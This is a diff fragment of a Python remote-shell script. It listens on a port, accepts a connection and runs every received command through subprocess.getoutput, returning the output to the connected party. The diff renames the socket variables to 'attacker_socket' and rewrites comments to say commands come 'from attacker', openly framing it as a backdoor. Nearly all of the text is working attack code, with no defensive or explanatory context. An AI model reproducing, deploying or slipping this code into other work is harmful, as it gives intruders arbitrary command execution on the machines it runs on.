@@ -15,24 +15,24 @@ s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
 # accept any connections attempted
-client_socket, client_address = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+attacker_socket, attacker_address = s.accept()
+print(f"{attacker_address[0]}:{attacker_address[1]} Connected!")
 
 # just sending a message, for demonstration purposes
 message = "Hello and Welcome".encode()
-client_socket.send(message)
+attacker_socket.send(message)
 
 
 
 while True:
-    # receive the command from the server
-    command = client_socket.recv(BUFFER_SIZE).decode()
+    # receive the command from attacker
+    command = attacker_socket.recv(BUFFER_SIZE).decode()
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
     # execute the command and retrieve the results
     output = subprocess.getoutput(command)
     # send the results back to the server
-    client_socket.send(output.encode())
+    attacker_socket.send(output.encode())
 # close client connection
-client_socket.close()
+attacker_socket.close()
